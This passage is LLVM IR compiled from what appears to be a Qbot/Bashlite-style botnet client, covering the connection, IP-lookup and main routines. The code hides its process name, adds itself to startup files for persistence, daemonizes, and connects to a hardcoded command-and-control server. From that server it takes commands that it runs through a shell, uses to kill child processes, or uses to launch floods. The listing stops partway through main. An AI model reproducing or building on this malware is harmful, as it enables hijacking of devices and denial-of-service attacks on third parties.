  tail call void @sendSTD(i8* %460, i32 %451, i32 %456)
  unreachable

.loopexit245.loopexit:                            ; preds = %.preheader244
  br label %.loopexit245

.loopexit245:                                     ; preds = %.loopexit245.loopexit, %.loopexit247
  %472 = load i8*, i8** %1, align 8
  %473 = tail call i32 @strcmp(i8* %472, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.534, i64 0, i64 0)) #15
  %474 = icmp eq i32 %473, 0
  br i1 %474, label %.preheader243, label %502

.preheader243:                                    ; preds = %.loopexit245
  %475 = load i64, i64* @numpids, align 8
  %476 = icmp eq i64 %475, 0
  br i1 %476, label %._crit_edge.thread, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader243
  br label %.lr.ph

._crit_edge.thread:                               ; preds = %.preheader243
  %477 = load i32, i32* @mainCommSock, align 4
  br label %499

.lr.ph:                                           ; preds = %.lr.ph.preheader, %491
  %.0257 = phi i64 [ %492, %491 ], [ 0, %.lr.ph.preheader ]
  %.0204256 = phi i32 [ %.1, %491 ], [ 0, %.lr.ph.preheader ]
  %478 = load i32*, i32** @pids, align 8
  %479 = getelementptr inbounds i32, i32* %478, i64 %.0257
  %480 = load i32, i32* %479, align 4
  %481 = icmp eq i32 %480, 0
  br i1 %481, label %491, label %482

; <label>:482:                                    ; preds = %.lr.ph
  %483 = tail call i32 @getpid() #3
  %484 = icmp eq i32 %480, %483
  br i1 %484, label %491, label %485

; <label>:485:                                    ; preds = %482
  %486 = load i32*, i32** @pids, align 8
  %487 = getelementptr inbounds i32, i32* %486, i64 %.0257
  %488 = load i32, i32* %487, align 4
  %489 = tail call i32 @kill(i32 %488, i32 9) #3
  %490 = add nsw i32 %.0204256, 1
  br label %491

; <label>:491:                                    ; preds = %482, %.lr.ph, %485
  %.1 = phi i32 [ %490, %485 ], [ %.0204256, %482 ], [ %.0204256, %.lr.ph ]
  %492 = add i64 %.0257, 1
  %493 = load i64, i64* @numpids, align 8
  %494 = icmp ult i64 %492, %493
  br i1 %494, label %.lr.ph, label %._crit_edge

._crit_edge:                                      ; preds = %491
  %495 = icmp sgt i32 %.1, 0
  %496 = load i32, i32* @mainCommSock, align 4
  br i1 %495, label %497, label %499

; <label>:497:                                    ; preds = %._crit_edge
  %498 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %496, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.535, i64 0, i64 0), i32 %.1)
  br label %502

; <label>:499:                                    ; preds = %._crit_edge.thread, %._crit_edge
  %500 = phi i32 [ %477, %._crit_edge.thread ], [ %496, %._crit_edge ]
  %501 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %500, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.536, i64 0, i64 0))
  br label %502

; <label>:502:                                    ; preds = %.loopexit245, %497, %499
  %503 = load i8*, i8** %1, align 8
  %504 = tail call i32 @strcmp(i8* %503, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.537, i64 0, i64 0)) #15
  %505 = icmp eq i32 %504, 0
  br i1 %505, label %506, label %.loopexit

; <label>:506:                                    ; preds = %502
  tail call void @exit(i32 0) #17
  unreachable

.loopexit.loopexit:                               ; preds = %.preheader
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %502, %468, %439, %393, %290, %200, %178, %156, %134, %112, %90, %68, %56, %32, %6, %2, %446, %448, %453, %415, %417, %422, %366, %297, %299, %304, %309, %317, %324, %222, %224, %229, %234, %239, %249, %21, %38, %12
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @PromServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #15
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #15
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 27, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.538, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #18
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.539, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.540, i64 0, i64 0)) #15
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #14 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.541, i64 0, i64 0)
}

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #12 {
  %3 = alloca i32, align 4
  %4 = alloca [256 x i8], align 16
  %5 = alloca [256 x i8], align 16
  %6 = alloca [1024 x i8], align 16
  %7 = alloca [4096 x i8], align 16
  %8 = alloca [1024 x i8], align 16
  %9 = alloca [10 x i8*], align 16
  %10 = load i8*, i8** %1, align 8
  %11 = tail call i64 @strlen(i8* %10) #15
  tail call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 %11, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i64 0, i64 0), i8** %1, align 8
  %12 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.542 to i64), i32 0, i32 0, i32 0) #3
  %13 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %14 = tail call i32 @getpid() #3
  %15 = xor i32 %14, %13
  tail call void @srand(i32 %15) #3
  %16 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %17 = tail call i32 @getpid() #3
  %18 = xor i32 %17, %16
  tail call void @init_rand(i32 %18)
  %19 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.543, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i64 0, i64 0))
  %20 = icmp eq %struct._IO_FILE* %19, null
  br i1 %20, label %21, label %.thread

; <label>:21:                                     ; preds = %2
  %22 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.545, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i64 0, i64 0))
  %23 = icmp eq %struct._IO_FILE* %22, null
  br i1 %23, label %60, label %.thread

.thread:                                          ; preds = %2, %21
  %.091106 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @.str.545, i64 0, i64 0), %21 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @.str.543, i64 0, i64 0), %2 ]
  %.096105 = phi %struct._IO_FILE* [ %22, %21 ], [ %19, %2 ]
  %24 = load i8*, i8** %1, align 8
  %25 = tail call i64 @strlen(i8* %24) #15
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 0
  %27 = call i8* @getcwd(i8* nonnull %26, i64 256) #3
  %28 = call i32 @strcmp(i8* nonnull %26, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.546, i64 0, i64 0)) #15
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %58, label %.preheader114

.preheader114:                                    ; preds = %.thread
  %30 = load i8*, i8** %1, align 8
  %sext = shl i64 %25, 32
  %31 = ashr exact i64 %sext, 32
  br label %32

; <label>:32:                                     ; preds = %32, %.preheader114
  %indvars.iv160 = phi i64 [ %indvars.iv.next161, %32 ], [ %31, %.preheader114 ]
  %33 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv160
  %34 = load i8, i8* %33, align 1
  %35 = icmp eq i8 %34, 47
  %indvars.iv.next161 = add i64 %indvars.iv160, -1
  br i1 %35, label %36, label %32

; <label>:36:                                     ; preds = %32
  %37 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 0
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %37, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.547, i64 0, i64 0), i8* nonnull %26, i8* %33) #3
  %39 = call i32 @feof(%struct._IO_FILE* nonnull %.096105) #3
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %.lr.ph147, label %._crit_edge148.thread

._crit_edge148.thread:                            ; preds = %36
  %41 = call i32 @fclose(%struct._IO_FILE* nonnull %.096105)
  br label %52

.lr.ph147:                                        ; preds = %36
  %42 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  br label %43

; <label>:43:                                     ; preds = %.lr.ph147, %43
  %.099145 = phi i32 [ 0, %.lr.ph147 ], [ %..099, %43 ]
  %44 = call i8* @fgets(i8* nonnull %42, i32 1024, %struct._IO_FILE* nonnull %.096105)
  %45 = call i32 @strcasecmp(i8* nonnull %42, i8* nonnull %37) #15
  %46 = icmp eq i32 %45, 0
  %47 = zext i1 %46 to i32
  %..099 = add nsw i32 %47, %.099145
  %48 = call i32 @feof(%struct._IO_FILE* nonnull %.096105) #3
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %43, label %._crit_edge148

._crit_edge148:                                   ; preds = %43
  %50 = icmp eq i32 %..099, 0
  %51 = call i32 @fclose(%struct._IO_FILE* nonnull %.096105)
  br i1 %50, label %52, label %60

; <label>:52:                                     ; preds = %._crit_edge148.thread, %._crit_edge148
  %53 = call %struct._IO_FILE* @fopen(i8* %.091106, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.548, i64 0, i64 0))
  %54 = icmp eq %struct._IO_FILE* %53, null
  br i1 %54, label %60, label %55

; <label>:55:                                     ; preds = %52
  %56 = call i32 @fputs(i8* nonnull %37, %struct._IO_FILE* nonnull %53)
  %57 = call i32 @fclose(%struct._IO_FILE* nonnull %53)
  br label %60

; <label>:58:                                     ; preds = %.thread
  %59 = call i32 @fclose(%struct._IO_FILE* nonnull %.096105)
  br label %60

; <label>:60:                                     ; preds = %52, %21, %58, %._crit_edge148, %55
  %61 = call i32 @getOurIP()
  %62 = call i32 @fork() #3
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %66, label %64

; <label>:64:                                     ; preds = %60
  %65 = call i32 @waitpid(i32 %62, i32* nonnull %3, i32 0) #3
  call void @exit(i32 0) #17
  unreachable

; <label>:66:                                     ; preds = %60
  %67 = call i32 @fork() #3
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %70, label %69

; <label>:69:                                     ; preds = %66
  call void @exit(i32 0) #17
  unreachable

; <label>:70:                                     ; preds = %66
  %71 = call i32 @setsid() #3
  %72 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.546, i64 0, i64 0)) #3
  %73 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 1
  %76 = getelementptr inbounds [10 x i8*], [10 x i8*]* %9, i64 0, i64 0
  br label %.outer

.outer:                                           ; preds = %147, %70
  %.089.ph = phi i32 [ %148, %147 ], [ 0, %70 ]
  br label %.backedge113

.backedge113.loopexit:                            ; preds = %.backedge
  br label %.backedge113.backedge

.backedge113:                                     ; preds = %.backedge113.backedge, %.outer
  %77 = call i32 @initConnection()
  %78 = icmp eq i32 %77, 0
  br i1 %78, label %81, label %79

; <label>:79:                                     ; preds = %.backedge113
  %80 = call i32 @sleep(i32 30) #3
  br label %.backedge113.backedge

; <label>:81:                                     ; preds = %.backedge113
  %82 = load i32, i32* @mainCommSock, align 4
  %83 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %84 = call i8* @inet_ntoa(i32 %83) #3
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 %82, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.550, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.541, i64 0, i64 0), i8* %84)
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = call i32 @recvLine(i32 %86, i8* nonnull %74, i32 4096)
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %.backedge113.backedge, label %.preheader111.preheader

.backedge113.backedge:                            ; preds = %81, %79, %.backedge113.loopexit
  br label %.backedge113

.preheader111.preheader:                          ; preds = %81
  br label %.preheader111

.preheader111:                                    ; preds = %.preheader111.preheader, %.backedge
  %89 = phi i32 [ %144, %.backedge ], [ %87, %.preheader111.preheader ]
  %90 = load i64, i64* @numpids, align 8
  %91 = icmp eq i64 %90, 0
  br i1 %91, label %._crit_edge132, label %.lr.ph131.preheader

.lr.ph131.preheader:                              ; preds = %.preheader111
  br label %.lr.ph131

.lr.ph131:                                        ; preds = %.lr.ph131.preheader, %134
  %indvars.iv = phi i64 [ %indvars.iv.next, %134 ], [ 0, %.lr.ph131.preheader ]
  %92 = load i32*, i32** @pids, align 8
  %93 = getelementptr inbounds i32, i32* %92, i64 %indvars.iv
  %94 = load i32, i32* %93, align 4
  %95 = call i32 @waitpid(i32 %94, i32* null, i32 1) #3
  %96 = icmp sgt i32 %95, 0
  br i1 %96, label %.preheader, label %134

.preheader:                                       ; preds = %.lr.ph131
  %97 = add nuw i64 %indvars.iv, 1
  %98 = load i64, i64* @numpids, align 8
  %99 = icmp ult i64 %97, %98
  %100 = load i32*, i32** @pids, align 8
  %101 = trunc i64 %indvars.iv to i32
  br i1 %99, label %.lr.ph122.preheader, label %._crit_edge123

.lr.ph122.preheader:                              ; preds = %.preheader
  %102 = trunc i64 %97 to i32
  %103 = trunc i64 %indvars.iv to i32
  br label %.lr.ph122

.lr.ph122:                                        ; preds = %.lr.ph122.preheader, %.lr.ph122
  %104 = phi i32* [ %113, %.lr.ph122 ], [ %100, %.lr.ph122.preheader ]
  %105 = phi i64 [ %110, %.lr.ph122 ], [ %97, %.lr.ph122.preheader ]
  %.094121 = phi i32 [ %.094, %.lr.ph122 ], [ %102, %.lr.ph122.preheader ]
  %.094.in120 = phi i32 [ %.094121, %.lr.ph122 ], [ %103, %.lr.ph122.preheader ]
  %106 = getelementptr inbounds i32, i32* %104, i64 %105
  %107 = load i32, i32* %106, align 4
  %108 = zext i32 %.094.in120 to i64
  %109 = getelementptr inbounds i32, i32* %104, i64 %108
  store i32 %107, i32* %109, align 4
  %.094 = add i32 %.094121, 1
  %110 = zext i32 %.094 to i64
  %111 = load i64, i64* @numpids, align 8
  %112 = icmp ult i64 %110, %111
  %113 = load i32*, i32** @pids, align 8
  br i1 %112, label %.lr.ph122, label %._crit_edge123.loopexit

._crit_edge123.loopexit:                          ; preds = %.lr.ph122
  br label %._crit_edge123

._crit_edge123:                                   ; preds = %._crit_edge123.loopexit, %.preheader
  %.094.in.lcssa = phi i32 [ %101, %.preheader ], [ %.094121, %._crit_edge123.loopexit ]
  %.lcssa = phi i32* [ %100, %.preheader ], [ %113, %._crit_edge123.loopexit ]
  %114 = zext i32 %.094.in.lcssa to i64
  %115 = getelementptr inbounds i32, i32* %.lcssa, i64 %114
  store i32 0, i32* %115, align 4
  %116 = load i64, i64* @numpids, align 8
  %117 = add i64 %116, -1
  store i64 %117, i64* @numpids, align 8
  %118 = shl i64 %116, 2
  %119 = call noalias i8* @malloc(i64 %118) #3
  %120 = bitcast i8* %119 to i32*
  %121 = icmp eq i64 %117, 0
  %122 = load i32*, i32** @pids, align 8
  br i1 %121, label %._crit_edge128, label %.lr.ph127.preheader

.lr.ph127.preheader:                              ; preds = %._crit_edge123
  br label %.lr.ph127

.lr.ph127:                                        ; preds = %.lr.ph127.preheader, %.lr.ph127
  %123 = phi i32* [ %132, %.lr.ph127 ], [ %122, %.lr.ph127.preheader ]
  %124 = phi i64 [ %129, %.lr.ph127 ], [ 0, %.lr.ph127.preheader ]
  %.195125 = phi i32 [ %128, %.lr.ph127 ], [ 0, %.lr.ph127.preheader ]
  %125 = getelementptr inbounds i32, i32* %123, i64 %124
  %126 = load i32, i32* %125, align 4
  %127 = getelementptr inbounds i32, i32* %120, i64 %124
  store i32 %126, i32* %127, align 4
  %128 = add i32 %.195125, 1
  %129 = zext i32 %128 to i64
  %130 = load i64, i64* @numpids, align 8
  %131 = icmp ult i64 %129, %130
  %132 = load i32*, i32** @pids, align 8
  br i1 %131, label %.lr.ph127, label %._crit_edge128.loopexit

._crit_edge128.loopexit:                          ; preds = %.lr.ph127
  br label %._crit_edge128

._crit_edge128:                                   ; preds = %._crit_edge128.loopexit, %._crit_edge123
  %.lcssa115 = phi i32* [ %122, %._crit_edge123 ], [ %132, %._crit_edge128.loopexit ]
  %133 = bitcast i32* %.lcssa115 to i8*
  call void @free(i8* %133) #3
  store i8* %119, i8** bitcast (i32** @pids to i8**), align 8
  br label %134

; <label>:134:                                    ; preds = %.lr.ph131, %._crit_edge128
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext162 = shl i64 %indvars.iv.next, 32
  %135 = ashr exact i64 %sext162, 32
  %136 = load i64, i64* @numpids, align 8
  %137 = icmp ult i64 %135, %136
  br i1 %137, label %.lr.ph131, label %._crit_edge132.loopexit

._crit_edge132.loopexit:                          ; preds = %134
  br label %._crit_edge132

._crit_edge132:                                   ; preds = %._crit_edge132.loopexit, %.preheader111
  %138 = sext i32 %89 to i64
  %139 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 %138
  store i8 0, i8* %139, align 1
  call void @trim(i8* nonnull %74)
  %strncmp = call i32 @strncmp(i8* nonnull %74, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %140, label %146

; <label>:140:                                    ; preds = %._crit_edge132
  %141 = load i32, i32* @mainCommSock, align 4
  %142 = call i32 (i32, i8*, ...) @sockprintf(i32 %141, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.551, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph144
  br label %.backedge

.backedge.loopexit175:                            ; preds = %.preheader150
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit175, %.backedge.loopexit, %._crit_edge141.thread, %140, %._crit_edge141, %152, %184
  %143 = load i32, i32* @mainCommSock, align 4
  %144 = call i32 @recvLine(i32 %143, i8* nonnull %74, i32 4096)
  %145 = icmp eq i32 %144, -1
  br i1 %145, label %.backedge113.loopexit, label %.preheader111

; <label>:146:                                    ; preds = %._crit_edge132
  %strncmp101 = call i32 @strncmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.552, i64 0, i64 0), i64 3)
  %cmp102 = icmp eq i32 %strncmp101, 0
  br i1 %cmp102, label %147, label %152

; <label>:147:                                    ; preds = %146
  %148 = add nuw nsw i32 %.089.ph, 1
  %149 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.553, i64 0, i64 0))
  %150 = icmp sgt i32 %.089.ph, 19
  br i1 %150, label %151, label %.outer

; <label>:151:                                    ; preds = %147
  call void @exit(i32 0) #17
  unreachable

; <label>:152:                                    ; preds = %146
  %153 = load i8, i8* %74, align 16
  %154 = icmp eq i8 %153, 33
  br i1 %154, label %.preheader150.preheader, label %.backedge

.preheader150.preheader:                          ; preds = %152
  br label %.preheader150

.preheader150:                                    ; preds = %.preheader150.preheader, %156
  %.092 = phi i8* [ %157, %156 ], [ %75, %.preheader150.preheader ]
  %155 = load i8, i8* %.092, align 1
  switch i8 %155, label %156 [
    i8 0, label %.backedge.loopexit175
    i8 32, label %158
  ]

; <label>:156:                                    ; preds = %.preheader150
  %157 = getelementptr inbounds i8, i8* %.092, i64 1
  br label %.preheader150

; <label>:158:                                    ; preds = %.preheader150
  store i8 0, i8* %.092, align 1
  %159 = call i64 @strlen(i8* %75) #15
  %160 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 %159
  %161 = getelementptr inbounds i8, i8* %160, i64 2
  br label %162

; <label>:162:                                    ; preds = %167, %158
  %163 = call i64 @strlen(i8* %161) #15
  %164 = add i64 %163, -1
  %165 = getelementptr inbounds i8, i8* %161, i64 %164
  %166 = load i8, i8* %165, align 1
  switch i8 %166, label %.preheader109.preheader [
    i8 13, label %167
    i8 10, label %167
  ]

.preheader109.preheader:                          ; preds = %162
  br label %.preheader109

; <label>:167:                                    ; preds = %162, %162
  store i8 0, i8* %165, align 1
  br label %162

.preheader109:                                    ; preds = %.preheader109.preheader, %169
  %.093 = phi i8* [ %170, %169 ], [ %161, %.preheader109.preheader ]
  %168 = load i8, i8* %.093, align 1
  switch i8 %168, label %169 [
    i8 32, label %171
    i8 0, label %171
  ]

; <label>:169:                                    ; preds = %.preheader109
  %170 = getelementptr inbounds i8, i8* %.093, i64 1
  br label %.preheader109

; <label>:171:                                    ; preds = %.preheader109, %.preheader109
  store i8 0, i8* %.093, align 1
  %172 = getelementptr inbounds i8, i8* %.093, i64 1
  %173 = load i8, i8* %161, align 1
  %174 = icmp eq i8 %173, 0
  br i1 %174, label %._crit_edge136, label %.lr.ph135.preheader

.lr.ph135.preheader:                              ; preds = %171
  br label %.lr.ph135

.lr.ph135:                                        ; preds = %.lr.ph135.preheader, %.lr.ph135
  %175 = phi i8 [ %180, %.lr.ph135 ], [ %173, %.lr.ph135.preheader ]
  %.090133 = phi i8* [ %179, %.lr.ph135 ], [ %161, %.lr.ph135.preheader ]
  %176 = zext i8 %175 to i32
  %177 = call i32 @toupper(i32 %176) #15
  %178 = trunc i32 %177 to i8
  store i8 %178, i8* %.090133, align 1
  %179 = getelementptr inbounds i8, i8* %.090133, i64 1
  %180 = load i8, i8* %179, align 1
  %181 = icmp eq i8 %180, 0
  br i1 %181, label %._crit_edge136.loopexit, label %.lr.ph135

._crit_edge136.loopexit:                          ; preds = %.lr.ph135
  br label %._crit_edge136

._crit_edge136:                                   ; preds = %._crit_edge136.loopexit, %171
  %182 = call i32 @strcmp(i8* %161, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.554, i64 0, i64 0)) #15
  %183 = icmp eq i32 %182, 0
  br i1 %183, label %184, label %199

; <label>:184:                                    ; preds = %._crit_edge136
  %185 = call i32 @listFork()
  %186 = icmp eq i32 %185, 0
  br i1 %186, label %187, label %.backedge

; <label>:187:                                    ; preds = %184
  %188 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %188, i8 0, i64 1024, i32 16, i1 false)
  %189 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %188, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.555, i64 0, i64 0), i8* %172)
  %190 = call i32 @fdpopen(i8* nonnull %188, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i64 0, i64 0))
  %191 = call i8* @fdgets(i8* nonnull %188, i32 1024, i32 %190)
  %192 = icmp eq i8* %191, null
  br i1 %192, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %187
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %188)
